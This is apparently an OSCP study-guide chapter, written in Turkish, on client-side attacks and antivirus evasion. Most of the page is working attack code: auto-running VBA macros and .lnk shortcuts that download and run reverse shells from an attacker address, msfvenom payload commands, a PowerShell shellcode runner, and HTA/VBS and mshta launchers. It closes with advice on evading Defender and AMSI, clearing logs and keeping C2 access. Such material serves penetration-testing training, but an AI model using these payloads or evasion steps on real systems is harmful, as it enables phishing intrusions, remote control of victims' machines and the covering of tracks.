---
layout: page
title: "Bölüm 9 — İstemci Saldırıları & AV Kaçınma"
oscp: true
toc: true
permalink: /oscp/09-istemci-av/
---

{% raw %}
Bu bölüm, kullanıcıyı (istemciyi) hedef alan saldırı ve payload üretimini
kapsar. Kural: **önce kendi lab'ında çalıştır, sonra hedefe taşı.** Defender'ın
açık olduğu gerçek ortamda test edilmemiş hiçbir payload sahneye çıkmaz.

## 9.1 VBA makro saldırıları

### 9.1.1 Temel makro (AutoOpen / Document_Open)

**Ne / ne zaman:** Word/Excel dosyasıyla sosyal mühendislik. Makro içeren
dosya `.doc` ya da `.docm` olarak kaydedilmeli (`.docx` makro saklayamaz).

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

**Tuzaklar / notlar:**
- Makro yazarken VBA editöründe **Macros** kısmında kendi dokümanını
  seçmeyi unutma; yanlış projeye yazılan makro kaydedilmez.
- MOTW (Mark of the Web) işaretli dosyalar Protected View'da açılır ve makro
  çalışmaz; kurbanın "Enable Editing" → "Enable Content" demesi gerekir.
- Microsoft, internetten gelen dosyalarda makroyu default engelliyor (Office
  2013+). Publisher gibi Protected View'sız Office uygulamaları alternatiftir
  ama kurulumu yaygın değildir.

### 9.1.2 Split-string trick (VBA 255 karakter sınırı)

**Ne / ne zaman:** Uzun PowerShell komutunu (örn. base64 reverse shell) makroya
gömmek için. VBA literal string'leri 255 karakterle sınırlı; **satır başına
çok daha az karakter** bölerek concatenate et.

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden "
    Str = Str + "iex(iwr http://<ATTACK_IP>:8181/Invoke-ConPtyShell.ps1 -UseBasicParsing)"
    Str = Str + "; Invoke-ConPtyShell <ATTACK_IP> 1234"
    CreateObject("Wscript.Shell").Run Str
End Sub
```

**Tuzaklar / notlar:**
- Satır bölme disiplini kritik: tek satırda uzun string VBA'de çalışmaz. Kendi
  Windows lab'ında önce makronun `MsgBox Str` ile doğru birleştiğini doğrula.
- Base64 encoded `-e` payload yerine download-and-execute kısa satırlar hem
  tespit hem uzunluk açısından daha güvenilirdir.
- PowerShell base64 payload `.lnk` içinde çok uzunsa çalışmayabilir; kısa
  download-string tercih et.

### 9.1.3 msfvenom ile VBA payload

```bash
# Çıktıyı yeni bir makroya yapıştır, .doc/.docm olarak kaydet
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACK_IP> LPORT=443 -f vba
```

## 9.2 .library-ms + WebDAV + .lnk (iki aşamalı saldırı)

**Ne / ne zaman:** Makro güvenlikleri yüksek hedeflerde. Aşama 1: kurban
çift tıkladığında WebDAV paylaşımını dizin gibi açan `.library-ms`. Aşama 2:
paylaşımdaki `.lnk` dosyası çift tıklandığında reverse shell.

### Aşama 0 — WebDAV sunucu

```bash
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

### Aşama 1 — config.Library-ms

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<ATTACK_IP></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

**Tuzaklar / notlar:**
- `<url>` IP'sini her gönderimden önce güncelle. Windows dosyayı açtıktan sonra
  `serialized` etiketi ekler ve url'yi `\\IP\DavWWWRoot` yapar; dosya diğer
  makinelerde/yeniden başlatmada boş görünebilir — hedefe göndermeden önce
  her seferinde orijinal içeriğe sıfırla.
- `windows.storage.dll,-34582` adı, metin tabanlı filtrelerde "shell32" için
  tetiklenen kontrollerden kaçınır.

### Aşama 2 — .lnk shortcut (reverse shell)

Shortcut'ı Windows'ta oluştur, hedef olarak kısa bir PowerShell
download-and-execute koy:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACK_IP>:8000/powercat.ps1');powercat -c <ATTACK_IP> -p 1234 -e powershell"
```

```bash
# SMB üzerinden teslimat (alternatif: e-posta / WebDAV içinden)
smbclient //<TARGET_IP>/share -U <DOMAIN>/<KULLANICI> -c 'put config.Library-ms'
```

**Tuzaklar / notlar:**
- Hem `.library-ms` hem `.lnk` içindeki IP'ler tutarlı olmalı — en sık hata.
- `.lnk` hedef alanı uzun PowerShell base64'ü taşıyamayabilir; kısa
  download-string kullan.
- WebDAV 80 portunda çalışmıyorsa Windows WebClient servisinin hedefte aktif
  olduğundan emin ol.

## 9.3 msfvenom ile payload üretimi

**Ne / ne zaman:** Standart shellcode/EXE üretimi. Encoder ve format seçimi
hedefin AV'sine göre.

```bash
# Basit reverse shell EXE
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=443 -f exe -o rev.exe

# x64 meterpreter HTTPS (güvenlik duvarı dostu)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACK_IP> LPORT=443 -f exe -o backupscript.exe

# PowerShell formatında shellcode (PowerShell runner için)
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=443 -f powershell -v sc

# C exploit'ine gömülecek byte dizisi; bad char'ları dışla
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=443 EXITFUNC=thread \
  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

# Diğer formatlar
msfvenom -p cmd/windows/reverse_powershell LHOST=<ATTACK_IP> LPORT=1234 -f vbs > 1.vbs
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=443 -f hta-psh -o thm.hta
```

**Tuzaklar / notlar:**
- `-f c` exploit içine yapıştırmaya hazır byte dizi üretir; `-f python`
  aynısını Python için üretir.
- `-b` bad characters: `\x00\x0a\x0d` neredeyse her zaman; ek olarak hedef
  protokole özel (örn. HTTP için `%`=`\x25`, `&`=`\x26`, `+`=`\x2b`, `=`=`\x3d`).
- Encoder tek başına modern Defender'ı geçmez; asıl değer bad-char temizliği.
- `EXITFUNC=thread` servisleri çökertmeden thread'i kapatır (stabilit için).

## 9.4 PowerShell shellcode runner

**Ne / ne zaman:** EXE yerine bellekte çalışan, disk izi az payload. Shellcode'u
`VirtualAlloc` + `CreateThread` ile çalıştırır.

### Runner script (bypass.ps1)

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);'

$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru
[Byte[]] $var1 = <SHELLCODE_BURAYA>   # msfvenom -f powershell -v sc çıktısı

$size = 0x1000
if ($var1.Length -gt 0x1000) { $size = $var1.Length }
$x = $var2::VirtualAlloc(0, $size, 0x3000, 0x40)   # MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
for ($i=0; $i -le ($var1.Length-1); $i++) { $var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1) }
$var2::CreateThread(0,0,$x,0,0,0)
for (;;) { Start-sleep 60 }
```

### Çalıştırma ve execution policy bypass

```powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Policy'yi hiç değiştirmeden
powershell -ex bypass -File bypass.ps1

# İkinci katman: scripti encode et, encoded olarak çalıştır
ps_encoder.py bypass.ps1
```

**Tuzaklar / notlar:**
- Değişken/namespace isimlerini (`iWin32`, `Win32Functions`) hedef imzasına
  göre genel isimlerle değiştirmek tespit oranını etkiler; `Add-Type` çağrısı
  kendisi IOC'dir.
- `for(;;) { Start-sleep 60 }` ana thread'i canlı tutar; yoksa runner
  process'i thread başlatıldıktan sonra çıkabilir.
- AMSI aktifse bu klasik runner string düzeyinde yakalanır; encode + indirme
  zincirlerini bkz. aşağıdaki OPSEC ilkeleri.

## 9.5 WSH / HTA alternatifleri (ek yüzeyler)

**Ne / ne zaman:** Makro kapalıysa diğer script çalıştırma yüzeyleri. Tek
başlarına AV bypass'ı sağlamaz; indirme zincirinin parçası olurlar.

```vbscript
' payload.vbs — gizli cmd çalıştırır
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run "cmd.exe /k", 1, True
```

```html
<!-- payload.hta — mshta.exe ile çalışır -->
<html><body><script>
var c = 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script></body></html>
```

```bash
# VBS uzantısı engelliyse .txt olarak sakla, motoru açıkça belirt
wscript /e:VBScript C:\Users\<KULLANICI>\Desktop\payload.txt

# mshta ile uzaktan tetikle (MSF web_delivery çıktısı)
mshta.exe http://<ATTACK_IP>:8080/<RANDOM>.hta
```

**Tuzaklar / notlar:**
- `.vbs` blacklist'liyse `.txt` + `/e:VBScript` ikincil yol.
- mshta/IE otomasyonu kurumsal ortamda kısıtlı olabilir; önce erişilebilirliği
  test et.

## 9.6 mingw ile exploit derleme / uyarlama

**Ne / ne zaman:** Exploit-DB'deki Windows PoC'lerini Kali'den hedef
mimariye (çoğunlukla 32-bit) cross-compile etmek. OSCP'de exploit "fixing"
sürecinin çekirdeği.

```bash
sudo apt install mingw-w64

# Temel derleme (32-bit Windows hedef)
i686-w64-mingw32-gcc 42341.c -o exploit.exe

# Linker hatası: WSAStartup / winsock sembolleri -> -lws2_32
i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32

# Yaygın ek kütüphaneler: -lws2_32 (socket), -lwininet (HTTP), -lole32/-loleaut32 (COM)
```

**Tuzaklar / notlar:**
- İlk derleme hatasını Google'la değil **ilk hata satırındaki sembol** ile ara;
  `WSAStartup` görüyorsan neredeyse her zaman eksik kütüphane bayrağıdır.
- Hedef mimariyi `file exploit.exe` ile doğrula; 64-bit hedefe 32-bit binary
  çalışır ama tersi (özellikle kernel/servis exploitlerinde) başarısız olur.
- Sabit IP/port içeren PoC'lerde hedef/geri bağlantı değerlerini ve uzunluk
  sınırlarını (buffer boyutları) kendi ortamına uyarla; hardcoded offset'leri
  hedef sürümle teyit et.
- Python/Perl exploitlerini C'ye portlarken socket mantığını (`socket`,
  `connect`, `send`) winsock'a çevirmeyi unutma.

## 9.7 Defender ve AV tespit notları

**Ne / ne zaman:** Tespitten kaçınma stratejisi. Amaç imzasız kalmak ve
davranışsal puanı düşük tutmak — "kaçır" değil "görünmez kal".

**Bilinmesi gerekenler:**
- **Statik (imza) tespit:** msfvenom default şablonları ve ünlü runner
  kalıpları (Add-Type + VirtualAlloc + CreateThread zinciri) imza ile
  yakalanır. Çözüm: özel şablon, değişken isimleri, bölünmüş indirme zinciri.
- **AMSI:** PowerShell/VBA/JS içeriği çalıştırılmadan taranır. Uzun base64
  stringler, `VirtualAlloc` tanımlı Add-Type blokları tipik yakalananlar.
- **Davranışsal:** RWX bellek ayırma + thread oluşturma, office process'inden
  `powershell.exe` spawn, Office çocuk process'leri = yüksek puan.
- **MOTW:** İnternetten inen dosyalar işaretlenir; macro ve çift tıklama
  senaryolarında ek onaylar doğurur.
- **Cloud-delivered protection:** Defender çevrimiçiyse yeni binary saniyeler
  içinde sandbox'a düşer; "lab'da çalışıyordu" ≠ "sahnede çalışır".

**Pratik ilkeler:**
1. Diskte mümkün olduğunca az kal: download-cradle (`iex(iwr ...)`) ile
   script'i bellekte çalıştır.
2. Zinciri uzat ama kontrollü: makro → kısa PS indirici → ikinci stage.
   Her katman ayrı tespit yüzeyi.
3. Yaygın LOLBin kalıplarını (mshta, wscript, encodedcommand) olduğu gibi
   kullanma; parametreleri böl/birleştir.
4. Kendi lab'ında Defender **açık** test et; yakalanan payload'ı iterasyona
   sok (isim değiştir, zincir böl, format değiştir).

## 9.8 C2 / tespit-kaçınma genel ilkeleri (OPSEC)

**Ne / ne zaman:** AV/EDR varlığında uzun ömürlü erişim. Bunlar OSCP kapsamında
"kaçınma", gerçek dünyada C2 OPSEC'inin özüdür.

- **Trafik tabanı:** 443/tcp üzerinde HTTPS, periyodik değil jitter'lı beacon;
  self-signed/sahte sertifika değil görünürde meşru TLS. DNS tüneli son çare.
- **Payload hijyeni:** Her hedefe özel üret (LHOST/LPORT/isim farklı);
  aynı binary'yi iki hedefe koyma (imza yayılır).
- **İz sürmeyi temizle:** Komut satırı geçmişi, PowerShell transcript, event
  log, prefetch; bkz. AD saldırıları bölümündeki OPSEC notları:
  [Bölüm 7](/oscp/07-ad-saldirilari/).
- **Süreç enjeksiyonu yerine meşru görünüm:** Office → powershell spawn'ı
  alarmdır; Office → meşru görünen script motoru → bellek içi stage daha
  düşük puan alır.
- **Tüneli koru:** Reverse shell'ler ölür; persistence ve alternatif tünel
  planı için bkz. [Bölüm 8](/oscp/08-pivoting/) (chisel/ligolo reverse
  modlar) ve [Bölüm 10](/oscp/10-vakalar/) vaka analizi.

---

[← Bölüm 8](/oscp/08-pivoting/) · [Bölüm 10 →](/oscp/10-vakalar/)
{% endraw %}
